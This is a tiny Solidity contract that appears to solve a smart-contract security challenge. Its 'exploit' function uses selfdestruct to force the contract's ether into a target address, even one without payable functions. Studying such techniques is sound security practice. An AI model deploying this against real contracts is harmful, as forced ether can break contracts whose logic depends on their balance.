pragma solidity ^0.4.20;
contract Force {
 function Force() public payable {}
 function collect() public payable returns(uint) {
    return address(this).balance;
}
 function exploit(address _target) public {
    selfdestruct(_target);
 }
}